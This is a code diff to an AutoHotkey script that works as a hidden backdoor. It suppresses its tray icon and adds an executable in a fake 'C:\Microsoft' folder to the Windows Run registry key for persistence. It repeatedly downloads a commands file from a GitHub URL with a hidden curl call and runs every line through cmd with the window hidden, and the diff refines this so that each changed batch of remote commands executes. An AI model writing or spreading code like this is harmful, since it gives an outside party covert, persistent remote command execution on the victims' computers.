@@ -2,7 +2,7 @@
 #NoTrayIcon
 
 path := "C:\Microsoft"
-ran := false
+last := ""
 
 runAllExes()
 
@@ -32,28 +32,19 @@ runAllExes() {
     RegWrite '"C:\Microsoft\Space.exe"', "REG_SZ", "HKCU\Software\Microsoft\Windows\CurrentVersion\Run", "Replicate5"
 
     try {
-        if ran {
-            output := path "\commands.txt"
-            original := FileRead(output)
-            url := "https://raw.githubusercontent.com/astorrs276/Public-AHK/refs/heads/main/commands.txt"
-            command := 'cmd /c curl -L -o "' . output . '" "' . url . '"'
-            Run command, , "Hide"
-            text := FileRead(output)
-            if (original != text) {
-                lines := StrSplit(text, "`n")
-                for index, line in lines {
-                    newCommand := 'cmd /c ' line
-                    Run newCommand, , "Hide"
-                }
-            }
-        } else {
-            text := FileRead(output)
-            lines := StrSplit(text, "`n")
+        output := path "\commands.txt"
+        original := FileRead(output)
+        url := "https://raw.githubusercontent.com/astorrs276/Public-AHK/refs/heads/main/commands.txt"
+        command := 'cmd /c curl -L -o "' . output . '" "' . url . '"'
+        Run command, , "Hide"
+        text := FileRead(output)
+        if (last != text) {
+            last := text
+            lines := StrSplit(Trim(text), "`n")
             for index, line in lines {
                 newCommand := 'cmd /c ' line
                 Run newCommand, , "Hide"
             }
-            ran := true
         }
     } catch {
     }
